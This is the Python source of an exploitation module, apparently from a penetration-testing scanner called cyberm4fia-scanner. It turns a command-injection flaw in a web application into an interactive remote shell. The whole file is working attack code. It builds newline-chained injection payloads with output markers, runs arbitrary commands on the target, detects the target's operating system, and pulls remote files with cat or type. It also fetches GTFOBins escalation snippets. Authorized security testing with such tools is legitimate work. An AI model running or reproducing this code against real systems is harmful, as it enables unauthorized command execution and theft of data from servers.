"""
cyberm4fia-scanner - Interactive Shell Module
Pseudo-interactive shell for Command Injection vulnerabilities.
"""

import os
import re
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

try:
    import readline  # noqa: F401
except ImportError:
    pass

from utils.colors import Colors, log_info, log_success, log_warning, log_error
from utils.request import smart_request
from utils.request import ScanExceptions


class InteractiveShell:
    """
    Interactive Shell for Command Injection.
    Uses marker-based injection to extract clean output from the response.
    """

    # Markers to isolate command output
    MARKER_START = "R4ND0M_S74R7"
    MARKER_END = "R4ND0M_END"

    def __init__(self, url, vuln_data):
        self.url = url
        self.vuln_data = vuln_data
        self.is_running = False
        self.current_dir = "/"  # Track virtual current directory
        self.os_type = "linux"  # Default, auto-detect later

        # Extract vuln details
        self.param = vuln_data.get("param") or vuln_data.get("field")
        self.orig_payload = vuln_data.get("payload", "")
        self.method = vuln_data.get("method", "get").lower()
        self.target_url = vuln_data.get("url", url)
        self.hidden_data = vuln_data.get("hidden_data", {})

        # Determine injection separator/style from payload
        self.separator = self._detect_separator(self.orig_payload)

    def _detect_separator(self, payload):
        """Detect the injection separator used in the payload"""
        separators = [";", "&&", "||", "|", "&", "%0a", "\n", "`", "$("]
        for sep in separators:
            if sep in payload:
                return sep
        return ";"  # Default

    def _construct_payload(self, cmd):
        """Construct the injection payload with markers"""
        # Combine cd + cmd if needed
        full_cmd = cmd
        if self.current_dir != "/":
            if self.os_type == "linux":
                full_cmd = f"cd {self.current_dir} && {cmd}"
            else:
                full_cmd = f"cd /d {self.current_dir} & {cmd}"

        # Use newline chaining — works on most targets even if ; and && are filtered
        # The key insight: pipe (|) feeds stdout→stdin and breaks marker extraction
        # Newline (\n) acts as a true command separator in shell
        prefix = "127.0.0.1"
        if self.orig_payload:
            for sep in ["|", ";", "&"]:
                if sep in self.orig_payload:
                    prefix = self.orig_payload.split(sep)[0].strip()
                    break

        if self.os_type == "linux":
            return (
                f"{prefix}\n"
                f"echo {self.MARKER_START}\n"
                f"{full_cmd}\n"
                f"echo {self.MARKER_END}\n"
            )
        else:
            return (
                f"{prefix}\r\n"
                f"echo {self.MARKER_START}\r\n"
                f"{full_cmd}\r\n"
                f"echo {self.MARKER_END}\r\n"
            )

    def _extract_output(self, response_text):
        """Extract command output between markers"""
        pattern = f"{self.MARKER_START}(.*?){self.MARKER_END}"
        match = re.search(pattern, response_text, re.DOTALL)
        if match:
            return match.group(1).strip()
        return None

    def execute(self, cmd):
        """Execute a command on the target"""
        payload = self._construct_payload(cmd)

        # Prepare request
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)

        if "Form" in self.vuln_data.get("type", ""):
            # Form-based
            data = {}
            # We might need to fill other required fields?
            # For now, simplistic approach: just the vuln field
            if self.hidden_data:
                data.update(self.hidden_data)
            data[self.param] = payload

            try:
                resp = smart_request(
                    self.method,
                    self.target_url,
                    params=data if self.method == "get" else None,
                    data=data if self.method == "post" else None,
                )
                return self._extract_output(resp.text)
            except ScanExceptions as e:
                return f"Error: {e}"
        else:
            # Param-based (GET)
            # Update params
            # Note: parse_qs returns lists, we need to handle that
            req_params = {k: v[0] for k, v in params.items()}
            req_params[self.param] = payload

            # Construct new URL
            exploit_url = urlunparse(parsed._replace(query=urlencode(req_params)))

            try:
                resp = smart_request("get", exploit_url)
                return self._extract_output(resp.text)
            except ScanExceptions as e:
                return f"Error: {e}"

    def check_connection(self):
        """Verify we can execute commands"""
        log_info("Verifying shell connection...")

        # Try Linux first
        self.os_type = "linux"
        out = self.execute("echo TEST_CONNECTION")
        if out and "TEST_CONNECTION" in out:
            log_success("Connection established! (Linux detected)")
            return True

        # Try Windows
        self.os_type = "windows"
        out = self.execute("echo TEST_CONNECTION")
        if out and "TEST_CONNECTION" in out:
            log_success("Connection established! (Windows detected)")
            return True

        log_error("Could not verify connection or extract output.")
        log_warning("Target might be blind or filtering 'echo'.")
        return False

    def run(self):
        """Start the interactive shell loop"""
        if not self.check_connection():
            try:
                choice = input(
                    f"{Colors.YELLOW}[?] Connection verification failed. Output extraction might not work. Continue anyway? (y/N) {Colors.END}"
                ).lower()
            except EOFError:
                print(
                    f"\n{Colors.YELLOW}[*] No input available, exiting shell.{Colors.END}"
                )
                return
            if choice != "y":
                return

        print(
            f"\n{Colors.GREEN}{Colors.BOLD}╔══════════════════════════════════════════╗"
        )
        print("║      INTERACTIVE SHELL ESTABLISHED       ║")
        print(f"╚══════════════════════════════════════════╝{Colors.END}")
        print(f"Target: {self.target_url}")
        print("Type 'exit' to quit, 'clear' to clean screen.\n")

        self.is_running = True

        while self.is_running:
            try:
                user_input = input(
                    f"{Colors.BLUE}shell@{self.os_type}:{self.current_dir}$ {Colors.END}"
                ).strip()

                if not user_input:
                    continue

                if user_input.lower() in ["exit", "quit"]:
                    self.is_running = False
                    print(f"\n{Colors.YELLOW}[*] Closing shell...{Colors.END}")
                    break

                if user_input.lower() == "clear":
                    os.system("clear")
                    continue

                if user_input.startswith("cd "):
                    # Handle cd locally (virtual tracking)
                    path = user_input[3:].strip()
                    if path == "..":
                        if self.current_dir != "/":
                            self.current_dir = os.path.dirname(
                                self.current_dir.rstrip("/")
                            )
                            if not self.current_dir:
                                self.current_dir = "/"
                    elif path == "/":
                        self.current_dir = "/"
                    else:
                        # Append to current dir (simplistic)
                        if self.current_dir == "/":
                            self.current_dir = f"/{path}"
                        else:
                            self.current_dir = f"{self.current_dir}/{path}"

                    # Verify validity of dir
                    out = self.execute("pwd" if self.os_type == "linux" else "cd")
                    if out:
                        # Since cd && pwd runs, out should be the new real dir
                        # Update strict real dir if possible
                        # Need to handle 'cd /etc && pwd' logic in execute
                        pass

                if user_input.startswith("!"):
                    # Built-in helper commands
                    cmd = user_input[1:].lower()
                    if cmd == "sysinfo":
                        if self.os_type == "linux":
                            output = self.execute("uname -a; id; pwd")
                        else:
                            output = self.execute(
                                'systeminfo | findstr /B /C:"OS Name" /C:"OS Version"; whoami; cd'
                            )
                        print(
                            f"{Colors.GREEN}--- System Info ---{Colors.END}\n{output}"
                        )
                    elif cmd.startswith("download "):
                        filename = user_input[10:].strip()
                        print(
                            f"{Colors.YELLOW}[*] Downloading {filename}...{Colors.END}"
                        )
                        if self.os_type == "linux":
                            output = self.execute(f"cat {filename}")
                        else:
                            output = self.execute(f"type {filename}")

                        if output and not output.startswith("Error:"):
                            local_name = os.path.basename(filename)
                            if not local_name:
                                local_name = "downloaded_file.txt"
                            with open(local_name, "w") as f:
                                f.write(output)
                            print(
                                f"{Colors.GREEN}[+] Saved to {local_name} ({len(output)} bytes){Colors.END}"
                            )
                        else:
                            print(
                                f"{Colors.RED}[!] Failed to read file or file is empty.{Colors.END}"
                            )
                    elif cmd.startswith("gtfobins "):
                        binary = cmd.split(" ", 1)[1].strip()
                        print(
                            f"{Colors.YELLOW}[*] Fetching GTFOBins payloads for '{binary}'...{Colors.END}"
                        )
                        try:
                            import httpx
                            import yaml

                            # Fetch raw markdown from GTFOBins repo
                            url = f"https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/{binary}"
                            r = httpx.get(url, timeout=5)
                            if r.status_code == 404:
                                # try lowercase/uppercase tricks
                                r = httpx.get(
                                    f"https://raw.githubusercontent.com/GTFOBins/GTFOBins.github.io/master/_gtfobins/{binary.lower()}",
                                    timeout=5,
                                )

                            if r.status_code == 200:
                                # Simple extraction of the YAML frontmatter
                                content = r.text
                                yaml_data = content
                                if content.startswith("---"):
                                    end_idx = content.find("---", 3)
                                    if end_idx != -1:
                                        yaml_data = content[3:end_idx]
                                    else:
                                        yaml_data = content[3:]

                                try:
                                    data = yaml.safe_load(yaml_data)
                                    if not data:
                                        data = {}
                                    functions = data.get("functions", {})
                                    if not functions:
                                        print(
                                            f"{Colors.RED}[!] No functions found for {binary}.{Colors.END}"
                                        )
                                    else:
                                        for (
                                            func_name,
                                            blocks,
                                        ) in functions.items():
                                            print(
                                                f"\n{Colors.GREEN}=== {func_name.upper()} ==={Colors.END}"
                                            )
                                            for block in blocks:
                                                code = block.get("code", "")
                                                if code:
                                                    print(
                                                        f"{Colors.CYAN}{code}{Colors.END}"
                                                    )
                                except ScanExceptions as ye:
                                    print(
                                        f"{Colors.RED}[!] Error parsing GTFOBins data: {ye}{Colors.END}"
                                    )
                            else:
                                print(
                                    f"{Colors.RED}[!] Binary '{binary}' not found on GTFOBins (404).{Colors.END}"
                                )
                        except ScanExceptions as e:
                            print(
                                f"{Colors.RED}[!] Error fetching GTFOBins: {e}{Colors.END}"
                            )
                    else:
                        print(
                            f"{Colors.YELLOW}[!] Unknown helper command. Available: !sysinfo, !download <file>, !gtfobins <binary>{Colors.END}"
                        )
                    continue

                # Execute command
                output = self.execute(user_input)

                if output:
                    print(output)
                else:
                    print(f"{Colors.GREY}(No output or blind execution){Colors.END}")

            except EOFError:
                print(
                    f"\n{Colors.YELLOW}[*] No input available (EOF). Exiting shell.{Colors.END}"
                )
                self.is_running = False
                break
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[*] Shell interrupted.{Colors.END}")
                self.is_running = False
                break
            except ScanExceptions as e:
                log_error(f"Shell error: {e}")
